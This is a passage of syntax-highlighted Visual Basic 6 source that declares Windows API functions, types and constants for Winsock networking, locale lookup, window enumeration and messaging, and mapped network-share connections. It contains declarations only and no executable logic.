</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
  </span><span class="sc7">wversion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">wHighVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">szDescription</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">szSystemStatus</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">iMaxSockets</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">iMaxUdpDg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">lpszVendorInfo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">HostLen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc0">
  </span><span class="sc7">h_name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">h_aliases</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">h_addrtype</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">h_length</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">h_addr_list</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cp</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">AF_INET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">level</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">optname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">optlen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc0">
  </span><span class="sc7">l_onoff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">l_linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostshort</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">af</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s_type</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">protocol</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">namelen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">buflen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">flags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">
  </span><span class="sc7">sin_family</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">sin_port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">sin_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">sin_zero</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lEvent</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H10</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H20</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetSystemDefaultLangID</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetLocaleInfo</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetLocaleInfoA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Locale</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LCType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpLCData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cchData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">LOCALE_SCOUNTRY</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H6</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"PostMessageA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_CLOSE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H10</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumWindows</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpfn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowText</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetWindowTextA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpString</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cch</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WNetAddConnection2</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"mpr.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WNetAddConnection2A"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lpNetResource</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">NETRESOURCE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpPassword</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpUserName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WNetCancelConnection2</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"mpr.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WNetCancelConnection2A"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">fForce</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">NETRESOURCE</span><span class="sc0">
  </span><span class="sc7">dwScope</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwDisplayType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwUsage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">lpLocalName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
  </span><span class="sc7">lpRemoteName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
  </span><span class="sc7">lpComment</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
  </span><span class="sc7">lpProvider</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">RESOURCETYPE_DISK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc0">
